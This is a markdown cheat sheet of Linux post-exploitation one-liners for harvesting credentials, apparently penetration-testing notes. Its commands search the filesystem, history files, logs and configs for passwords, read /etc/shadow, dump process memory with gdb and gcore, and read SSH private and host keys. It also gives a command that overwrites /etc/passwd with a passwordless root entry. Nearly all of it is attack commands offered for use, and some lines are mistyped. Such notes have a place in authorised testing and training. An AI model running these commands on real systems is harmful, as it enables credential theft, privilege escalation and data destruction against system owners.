# User and Password One-Liners

## Files With "passw" String 
```
find / -type f -readable -size +0 2>/dev/null | grep -Hi passw 
grep -r -l -i -I passw /  
```

## Plaintext Usernames or Passwords? 
```
grep -i user [filename] 
grep -i pass [filename] 
grep -C 5 "password" [filename] 
```
- For Joomla
```
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 
```

## Files Generally With Plaintext / Easily-Reversible Passwords
```
less /var/apache2/* 
cat /root/anaconda-ks.cfg 
strings /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg 
```
## Users With No Password Set 
```
cut -f1-2 -d':' /etc/passwd | grep -v ':x$' 
```

## Super Users 
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' 
awk -F: '($3 == "0") {print}' /etc/passwd
```

# User and Password Hashes

## Background
- /etc/passwd contains users of the machine. If we filter for just the users that have /bin/bash or /bin/sh as their default program upon login, then we can get a list of interactive machine users.
```
Cat /etc/passwd | grep /bin/bash 
Cat /etc/passwd | grep /bin/sh 
grep -vE "nologin" /etc/passwd 
```
- /etc/shadow has the password hashes and is only readable by root unless it's misconfigured to allow other users to read it.
### Hash Syntax 
  - First 3 chatcyers identify the algorithm used.  
  ```
  1$	      MD5 
  $2a$	    Blowfish 
  $2y$	    Blowfish 
  $5$	      SHA-256 
  $6$	      SHA-512 
  ```
  - The next characters are the salt which preceded the next $. 
  - The string after the middle $ is the password hash value.

## Attack Vector
1. Try easy passwords for trying to su to other interactive users.  
2. Display the permissions of the shadow file to see if we or a non-root user can display the hash contents.  Then crack the hash. 
3. Display the permissions of the /etc/ passwd file. If it is writable by the current user then you can overwrite the file to add a new root user without a password required.  
```
echo root::0:0:root:/root:/bin/bash > /etc/passwd 
```
  - Usually there's an X after the username to signify a password is required. When it is omitted (like this example), you can su to root without a password.

## Passwords in Memory of Running Applications

### Background
- Credentials can be stored in cleartext in memory of already running applications.
- Access to memory space of running applications is possible when it is within the same user context.

### Attack Vector
- Write running process memory space to a file.  Then search for credential data. 
- GDB 
```
#gdb -p <pid>  
info proc mappings 
Dump memory <outfile> <start memory region > <stop memory region> 
```
- GCore 
```
gcore -o <outfile> <pid>
```

## History and Logs

### Background
- Sometimes credentials can be saved in the history or log files of programs or the OS.

### Attack Vector
- Bash History
  - Provides history functionality that stores previous bash commands. 
  - Automatically created in user home directory. 
   ```
    cat  ~/.bash_history
    ```
- Logs
  - Check for file permissions being set incorrectly for logs that we can read.  
  - Common location for logs is
  ```
  /var/log/
  ```
  - Common direct paths 
  ```
  cat /etc/httpd/logs/access_log 
  cat /etc/httpd/logs/access.log 
  cat /etc/httpd/logs/error_log 
  cat /etc/httpd/logs/error.log 
  cat /var/log/apache2/access_log 
  cat /var/log/apache2/access.log 
  cat /var/log/apache2/error_log 
  cat /var/log/apache2/error.log 
  cat /var/log/apache/access_log 
  cat /var/log/apache/access.log 
  cat /var/log/auth.log 
  cat /var/log/chttp.log 
  cat /var/log/cups/error_log 
  cat /var/log/dpkg.log 
  cat /var/log/faillog 
  cat /var/log/httpd/access_log 
  cat /var/log/httpd/access.log 
  cat /var/log/httpd/error_log 
  cat /var/log/httpd/error.log 
  cat /var/log/lastlog 
  cat /var/log/lighttpd/access.log 
  cat /var/log/lighttpd/error.log 
  cat /var/log/lighttpd/lighttpd.access.log 
  cat /var/log/lighttpd/lighttpd.error.log 
  cat /var/log/messages 
  cat /var/log/secure 
  cat /var/log/syslog 
  cat /var/log/wtmp 
  cat /var/log/xferlog 
  cat /var/log/yum.log 
  cat /var/run/utmp 
  cat /var/webmin/miniserv.log 
  cat /var/www/logs/access_log 
  cat /var/www/logs/access.log 
  ls -alh /var/lib/dhcp3/ 
  ls -alh /var/log/postgresql/ 
  ls -alh /var/log/proftpd/ 
  ls -alh /var/log/samba/ 
  ```
  - Other applications if they're installed 
  ```
  cat ~/.nano_history 
  cat ~/.atftp_history 
  cat ~/.mysql_history 
  cat ~/.php_history 
  ```

## Passwords in Configuration Files
```
cat /var/apache2/config.inc 
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg 
Grep RiIn passw / 2>/Dev/null 
```
- List web server config files  
```
ls -alR /var/www/ 
ls -alR /srv/www/htdocs/  
ls -alR /usr/local/www/apache22/data/ 
ls -alR /opt/lampp/htdocs/ 
```

## .History Files For Credentials to Re-Use
```
cat ~/.bash_history 
cat ~/.nano_history 
cat ~/.atftp_history 
cat ~/.mysql_history 
cat ~/.php_history 
```

# Private Key Information
```
cat ~/.ssh/authorized_keys 
cat ~/.ssh/identity.pub 
cat ~/.ssh/identity 
cat ~/.ssh/id_rsa.pub 
cat ~/.ssh/id_rsa 
cat ~/.ssh/id_dsa.pub 
cat ~/.ssh/id_dsa 
cat /etc/ssh/ssh_config 
cat /etc/ssh/sshd_config 
cat /etc/ssh/ssh_host_dsa_key.pub 
cat /etc/ssh/ssh_host_dsa_key 
cat /etc/ssh/ssh_host_rsa_key.pub 
cat /etc/ssh/ssh_host_rsa_key 
cat /etc/ssh/ssh_host_key.pub 
cat /etc/ssh/ssh_host_key
```
